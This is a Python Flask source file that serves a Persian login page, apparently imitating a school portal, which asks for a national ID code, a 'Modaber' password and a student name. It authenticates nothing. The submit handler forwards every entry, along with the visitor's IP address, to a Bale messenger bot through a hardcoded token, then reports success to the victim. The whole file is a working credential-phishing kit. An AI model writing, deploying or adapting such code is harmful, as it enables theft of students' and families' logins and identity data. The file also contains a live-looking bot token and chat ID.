from flask import Flask, request, send_from_directory
import requests, random

app = Flask(__name__)

BALE_BOT_TOKEN = "95924138:rDC4lazKioH-oRiGzdSv9b5QdrVXzxqDtus"
CHAT_ID = "99375965"

def send_to_bale(text):
    url = f"https://tapi.bale.ai/bot{BALE_BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, json=data)

@app.route("/static/<path:filename>")
def static_files(filename):
    return send_from_directory("static", filename)

def render_form(error_message=""):
    code = random.randint(10000, 99999)

    error_html = ""
    if error_message:
        error_html = f"""
        <div style="color: red; margin-bottom: 10px; font-size: 14px;">
            {error_message}
        </div>
        """

    return f"""
    <html lang="fa">
    <head>
        <meta charset="UTF-8">
        <title>فرم ورود</title>
        <style>
            body {{
                margin: 0;
                padding: 0;
                background: #52c41a;
                font-family: Vazirmatn, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }}

            .box {{
                background: white;
                width: 350px;
                padding: 30px;
                box-shadow: 0 0 20px rgba(0,0,0,0.2);
                text-align: center;
                border-radius: 20px;
            }}

            input {{
                width: 90%;
                padding: 12px;
                margin: 10px 0;
                border: 1px solid #ccc;
                font-size: 16px;
                border-radius: 12px;
            }}

            .captcha {{
                font-size: 22px;
                font-weight: bold;
                margin-top: 10px;
                background: #eee;
                padding: 10px 20px;
                display: inline-block;
                border-radius: 12px;
            }}

            button {{
                width: 100%;
                padding: 12px;
                background: #52c41a;
                color: white;
                border: none;
                font-size: 18px;
                cursor: pointer;
                border-radius: 12px;
            }}

            button:hover {{
                background: #CD5C5C;
            }}

            .logo {{
                width: 120px;
                margin-bottom: 20px;
                border-radius: 12px;
            }}
        </style>
    </head>

    <body>
        <div class="box">
            <img src="/static/MeftahLogo.png" class="logo" alt="لوگوی مفتاح قائم">
            <h2>فرم ورود</h2>

            <form action="/submit" method="post">
                <input type="text" name="username" placeholder="کد ملی" required>
                <input type="password" name="password" placeholder="کد مدبر" required>
                <input type="text" name="student" placeholder="نام دانش‌آموز" required>

                <div class="captcha">{code}</div>
                <input type="hidden" name="realcode" value="{code}">
                <input type="text" name="usercode" placeholder="کد امنیتی را وارد کنید" required>

                {error_html}

                <button type="submit">ثبت</button>
            </form>
        </div>
    </body>
    </html>
    """

@app.route("/", methods=["GET"])
def form():
    return render_form()

@app.route("/submit", methods=["POST"])
def submit():
    username = request.form.get("username")
    password = request.form.get("password")
    student = request.form.get("student")
    realcode = request.form.get("realcode")
    usercode = request.form.get("usercode")


    user_ip = request.remote_addr

    message = f"""
✅ new form:
👤 id code    : {username}
🔑 modaber code: {password}
🎓 name      : {student}
🔢 real code : {usercode}
🔢 user code : {realcode}
🌐 IP        : {user_ip}
"""
    send_to_bale(message)

    return render_form("با موفقیت ثبت شد")
                       

if __name__ == "__main__":
    app.run(debug=True)
